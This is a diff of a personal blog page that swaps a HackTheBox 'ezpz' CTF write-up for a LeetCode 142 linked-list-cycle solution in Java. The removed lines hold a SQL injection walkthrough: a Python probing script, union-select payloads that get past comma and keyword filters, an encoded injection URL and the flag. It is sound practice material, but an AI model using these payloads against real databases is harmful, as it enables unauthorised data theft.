@@ -21,26 +21,24 @@
     var CONFIG = {"hostname":"blog.ydq6.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="本文主要讲解hackthebox上的20分挑战ezpz">
+  <meta name="description" content="题目说明： 给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。 说明：不允许修改给定的链表。 来源：力扣（LeetCode）链接：https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;linked-list-cyc">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hackthebox_expz">
-<meta property="og:url" content="http://blog.ydq6.com/web/hackthebox-expz/index.html">
+<meta property="og:title" content="Leetcode142_环形链表_II">
+<meta property="og:url" content="http://blog.ydq6.com/uncategorized/Leetcode142-%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8-II/index.html">
 <meta property="og:site_name" content="gwolfs的个人博客">
-<meta property="og:description" content="本文主要讲解hackthebox上的20分挑战ezpz">
+<meta property="og:description" content="题目说明： 给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。 说明：不允许修改给定的链表。 来源：力扣（LeetCode）链接：https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;linked-list-cyc">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200513220512964.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200513220834140.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200513222409658.png">
-<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200513234046121.png">
-<meta property="article:published_time" content="2020-05-13T15:57:22.000Z">
-<meta property="article:modified_time" content="2020-05-13T15:58:10.530Z">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200523203221526.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200524001721432.png">
+<meta property="og:image" content="http://blog.ydq6.com/assets/image-20200524002314952.png">
+<meta property="article:published_time" content="2020-05-23T09:30:31.000Z">
+<meta property="article:modified_time" content="2020-05-23T16:23:40.191Z">
 <meta property="article:author" content="gwolfs">
-<meta property="article:tag" content="hack_the_box">
-<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="web安全 SGX">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://blog.ydq6.com/assets/image-20200513220512964.png">
+<meta name="twitter:image" content="http://blog.ydq6.com/assets/image-20200523203221526.png">
 
-<link rel="canonical" href="http://blog.ydq6.com/web/hackthebox-expz/">
+<link rel="canonical" href="http://blog.ydq6.com/uncategorized/Leetcode142-%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8-II/">
 
 
 <script id="page-configurations">
@@ -53,7 +51,7 @@
   };
 </script>
 
-  <title>hackthebox_expz | gwolfs的个人博客</title>
+  <title>Leetcode142_环形链表_II | gwolfs的个人博客</title>
   
 
 
@@ -178,7 +176,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://blog.ydq6.com/web/hackthebox-expz/">
+    <link itemprop="mainEntityOfPage" href="http://blog.ydq6.com/uncategorized/Leetcode142-%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8-II/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/head1.png">
@@ -191,7 +189,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          hackthebox_expz
+          Leetcode142_环形链表_II
         </h1>
 
         <div class="post-meta">
@@ -201,19 +199,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-05-13 23:57:22 / 修改时间：23:58:10" itemprop="dateCreated datePublished" datetime="2020-05-13T23:57:22+08:00">2020-05-13</time>
+              <time title="创建时间：2020-05-23 17:30:31" itemprop="dateCreated datePublished" datetime="2020-05-23T17:30:31+08:00">2020-05-23</time>
             </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
                 </span>
-            </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-24 00:23:40" itemprop="dateModified" datetime="2020-05-24T00:23:40+08:00">2020-05-24</time>
+              </span>
 
           
 
@@ -226,62 +221,64 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>本文主要讲解hackthebox上的20分挑战ezpz</p>
+        <p>题目说明：</p>
+<p>给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。</p>
+<p>为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。</p>
+<p>说明：不允许修改给定的链表。</p>
+<p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/linked-list-cycle-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/linked-list-cycle-ii</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p>
 <a id="more"></a>
 
-<p>(1)创建实例</p>
-<p>创建示例，然后进入发现是个网站：</p>
-<p><img src="/assets/image-20200513220512964.png" alt="image-20200513220512964"></p>
-<p>需要参数obj，随便输入obj参数，发现ID属性还是没有。</p>
-<p>（2）扫描</p>
-<p>用dirb扫描网站：</p>
-<p><img src="/assets/image-20200513220834140.png" alt="image-20200513220834140"></p>
-<p>打开所有文件，发现都是一样的。</p>
-<p>（3）漏洞挖掘</p>
-<p>既然只有一个文件，那思路就在这个文件。发现源码中最下面（<font color="red">特别隐蔽的点</font>）有个提示</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Hint : base64_encode($data)--&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>然后obj有个属性ID,所以添加参数后encode。</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">obj</span>=&#123;<span class="string">"ID"</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<p>encode后：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">obj</span>=eyJJRCI6MX0=</span><br></pre></td></tr></table></figure>
-
-<p>成功:</p>
-<p><img src="/assets/image-20200513222409658.png" alt="image-20200513222409658"></p>
-<p>所以可以在ID处看下有注入没有。</p>
-<p>由于手工测试比较麻烦，所以写脚本测试：</p>
-<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line">url=<span class="string">"http://docker.hackthebox.eu:31417/?obj="</span></span><br><span class="line">def send(ID):</span><br><span class="line">	param = '&#123;<span class="string">"ID"</span>:<span class="string">"%s"</span>&#125;'%ID</span><br><span class="line">	param = <span class="built_in">base64</span>.b64encode(param.encode()).decode()</span><br><span class="line">	cur_url = url+param</span><br><span class="line">	<span class="built_in">print</span>(cur_url)</span><br><span class="line">	<span class="built_in">content</span> = requests.<span class="built_in">get</span>(cur_url).<span class="built_in">content</span>.decode('utf-<span class="number">8</span>')</span><br><span class="line">	<span class="keyword">if</span>(len(<span class="built_in">content</span>) != <span class="number">393</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">content</span>)</span><br></pre></td></tr></table></figure>
 
 
+<h2><span id="方式一使用额外空间判断是否遍历过">方式一，使用额外空间判断是否遍历过。</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle1</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">       ListNode node = head;</span><br><span class="line">       HashSet&lt;ListNode&gt; visitedSet = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">       <span class="keyword">while</span>(node != <span class="keyword">null</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(visitedSet.contains(node))&#123;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               visitedSet.add(node);</span><br><span class="line">           &#125;</span><br><span class="line">           node = node.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> node;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1#"</span>)</span></span>  正确</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' and 1#"</span>)</span></span> 正确</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' order by 1 #"</span>)</span></span>  <span class="attribute">order</span> 被拦截了</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' union select 1 #"</span>)</span></span> 正确</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' union select 1,2 #"</span>)</span></span> block了，猜想是block了，</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1', #"</span>)</span></span> block，确实block了逗号</span><br></pre></td></tr></table></figure>
-
-<p>由于过滤了逗号，所以在网上找过滤逗号思路，找到了一种：</p>
-<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> ((<span class="title">select</span> 1)<span class="title">A</span> <span class="title">join</span> (<span class="title">select</span> 2)<span class="title">B</span> <span class="title">join</span> (<span class="title">select</span> 3)<span class="title">C</span>）;</span></span><br></pre></td></tr></table></figure>
-
-<p>继续注入：</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"1' union select * from ((select 1)A join (select 2)B) #"</span>)</span></span>  成功</span><br><span class="line">测试回显位：</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"-1' union select * from ((select 1)A join (select 2)B) #"</span>)</span></span> 发现显示<span class="number">2</span>，证明第<span class="number">2</span>位为回显位。</span><br><span class="line">接下来测试哪些关键词被过滤了：</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"information_schema.tables"</span>)</span></span> blcok了，经尝试有schema.tables关键词则会报错。</span><br><span class="line">然而数据库和表名都可以加`</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"`schema`.`tables`"</span>)</span></span> 成功，成功绕过。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"where table_schema=database()"</span>)</span></span>  block了，经测试是where被block了。</span><br><span class="line"><span class="function"><span class="title">send</span><span class="params">(<span class="string">"group_concat(table_name)"</span>)</span></span> group_concat被block了</span><br></pre></td></tr></table></figure>
-
-<p>尝试：</p>
-<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send("-1' union <span class="keyword">select</span> * <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.<span class="symbol">`tables`</span>)B) #<span class="string">")</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>访问:</p>
-<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//docker.hackthebox.eu:31417/?obj=eyJJRCI6Ii0xJyB1bmlvbiBzZWxlY3QgKiBmcm9tICgoc2VsZWN0IDEpQSBqb2luIChzZWxlY3QgdGFibGVfbmFtZSBmcm9tIGBpbmZvcm1hdGlvbl9zY2hlbWFgLmB0YWJsZXNgKUIpICMifQ==</span></span><br></pre></td></tr></table></figure>
-
-<p>得到表：</p>
-<p><img src="/assets/image-20200513234046121.png" alt="image-20200513234046121"></p>
-<p>仔细观察发现可疑表：FlagTableUnguessableEzPZ</p>
-<p>直接select 尝试：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send("-1' union <span class="keyword">select</span> * <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> * <span class="keyword">from</span> FlagTableUnguessableEzPZ)B) <span class="comment">#")</span></span><br></pre></td></tr></table></figure>
-
-<p>运气好，只有一个字段，显示出flag:</p>
-<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTB&#123;T<span class="number">0</span>oE<span class="number">4</span>syP<span class="number">34</span>syL<span class="number">4</span><span class="name">m3</span>SQLiF!<span class="keyword">lt</span><span class="number">3</span>rs&#125;</span><br></pre></td></tr></table></figure>
+<h2><span id="方法二快慢指针法">方法二，快慢指针法</span></h2><p>慢指针：每次走一步</p>
+<p>快指针：每次走两步</p>
+<p>如果快慢指针相遇且任意一个指针不为null则一定存在环。</p>
+<p>首结点索引0，环起点索引b，环终点索引e，相遇点索引m，环长（e-b+1）.</p>
+<p><img src="/assets/image-20200523203221526.png" alt="image-20200523203221526"></p>
+<p>相遇时间为t</p>
+<p>$$ 2t=b-1+(m-b+1)+(e-b+1)*k1$$    k1圈</p>
+<p>$$ t=b-1+(m-b+1)+(e-b+1)*k2 $$     k2圈</p>
+<p>简化:</p>
+<p>$$ 2t=m+(e-b+1)*k1$$</p>
+<p>$$ t= m+(e-b+1)*k2$$</p>
+<p>再简化：</p>
+<p>$$ t=(e-b+1)*(k1-k2) $$</p>
+<p>只知道t，目标是求b。方程组是求不出来的。</p>
+<p>现在证明一个问题，k2=0。相当于证明$$t&lt;e$$</p>
+<p>经过问题分析，总结结论：</p>
+<p><font color="orange">结论一 、如果快指针在慢指针后面，快指针想超过慢指针，它们必须会相遇。</font></p>
+<p>证明：</p>
+<p>（1）如果快指针比慢指针慢1步。下1s慢指针走1步，快指针走2步，快慢相遇。</p>
+<p>（2）如果快指针比慢指针慢2步，下1s慢指针走1步，快指针走2步，快指针比慢指针慢1。问题转化为（1）</p>
+<p>（3）其他问题都可以归纳为问题（1）和问题（2），即归纳为问题（1）</p>
+<p>所以一定会相遇。</p>
+<p><font color="orange">结论二、慢指针第一次到达环尾必定和快指针相遇至少一次。</font></p>
+<p>反证法:<font color="red">假设慢指针第一次到达环尾都没有和快指针相遇过。</font></p>
+<p>慢指针到达环尾走了e步。此时快指针走了2e步。</p>
+<p>慢指针走了b步，就在环头了。此时快指针走了2b步，且肯定在环上。</p>
+<p>此时分为两种情况：</p>
+<p>（1）快指针和慢指针都在环头。此时快慢指针相遇，与假设矛盾。</p>
+<p>（2）快指针不在环头，假设快指针此时在索引k点。接下来慢指针走（e-b）步到达e点，此时快指针亦走了2（e-b）步。而环的总长度为（e-b）。快指针在环上走了两圈，快指针在环上走了一圈，肯定存在快指针超过慢指针情况。根据结论一，快慢指针必定会相遇，与假设矛盾。</p>
+<p>所以慢指针第一次到达环尾必定和快指针相遇至少一次。</p>
+<p>所以问题可以简化为：</p>
+<p>$$t=m$$</p>
+<p>$$ 2t=m+(e-b+1)*k1 $$</p>
+<p>即$$t=m=(e-b+1)*k1$$</p>
+<p>现在慢指针走(e-m+1)+(e-b+1)*k步可以到达入口点，其中k为任意常数，代表圈数。</p>
+<p>如果同时有个慢指针（每次只走一步）从链头出发，走b步可以到达环头。</p>
+<p><font color="orange">如果在快慢指针相遇时，有一个慢指针s2从链头参加走动，则当这个慢指针第一次到达环头时会和另一个慢指针s1相遇</font></p>
+<p>慢指针s2到达环头时走了b步,此时s2也走了b步。</p>
+<p>由下面分析发现此时s2也在环头，且走路（k1-1）圈。</p>
+<p><img src="/assets/image-20200524001721432.png" alt="image-20200524001721432"></p>
+<p>因此代码就很简单了。s1和s2第一次相遇点即为环头。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode slow1Pointer = head;</span><br><span class="line">        ListNode quickPointer = head;</span><br><span class="line">        <span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            slow1Pointer = slow1Pointer.next;</span><br><span class="line">            ListNode tmpQuickPointer = quickPointer.next;</span><br><span class="line">            <span class="keyword">if</span> (tmpQuickPointer == <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            quickPointer = tmpQuickPointer.next;</span><br><span class="line">            <span class="keyword">if</span>(quickPointer == <span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            t++;</span><br><span class="line">        &#125;<span class="keyword">while</span> (slow1Pointer != quickPointer);</span><br><span class="line">        ListNode slow2Pointer = head;</span><br><span class="line">        <span class="keyword">while</span>(slow1Pointer != slow2Pointer)&#123;</span><br><span class="line">            slow2Pointer = slow2Pointer.next;</span><br><span class="line">            slow1Pointer = slow1Pointer.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow1Pointer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 
 
+<p>效率：</p>
+<p><img src="/assets/image-20200524002314952.png" alt="image-20200524002314952"></p>
 
     </div>
 
@@ -302,10 +299,6 @@
 
 
       <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/hack-the-box/" rel="tag"><i class="fa fa-tag"></i>hack_the_box</a>
-              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i>sql注入</a>
-          </div>
 
         
 
@@ -313,13 +306,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/uncategorized/MyWebServer1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="prev" title="MyWebServer1靶机练习">
-      <i class="fa fa-chevron-left"></i> MyWebServer1靶机练习
+    <a href="/web/hackthebox-expz/" rel="prev" title="hackthebox_expz">
+      <i class="fa fa-chevron-left"></i> hackthebox_expz
     </a></div>
-      <div class="post-nav-item">
-    <a href="/uncategorized/Leetcode142-%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8-II/" rel="next" title="Leetcode142_环形链表_II">
-      Leetcode142_环形链表_II <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -378,6 +368,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">方式一，使用额外空间判断是否遍历过。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">方法二，快慢指针法</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
